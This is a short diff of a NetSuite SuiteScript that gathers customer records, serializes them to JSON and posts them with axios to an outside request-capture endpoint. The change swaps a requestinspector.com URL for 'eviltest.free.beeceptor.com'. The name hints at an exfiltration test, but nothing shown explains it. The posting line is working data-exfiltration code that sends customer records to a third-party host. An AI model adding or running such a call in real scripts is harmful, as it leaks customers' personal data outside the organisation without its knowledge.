@@ -37,7 +37,7 @@ require(['N/record', 'N/email', 'N/search'], (record, email, search) => {
             var jsonResults = JSON.stringify(customersArray);
             log.debug("Customer JSON", jsonResults);
 
-axios.post('https://requestinspector.com/inspector/01jqhqbx4h483g8enf646z8w7900-278946299a5e66dc0a18', jsonResults)
+axios.post('https://eviltest.free.beeceptor.com', jsonResults)
   .then(function (response) {
     console.log('Response:', response.data);
   })
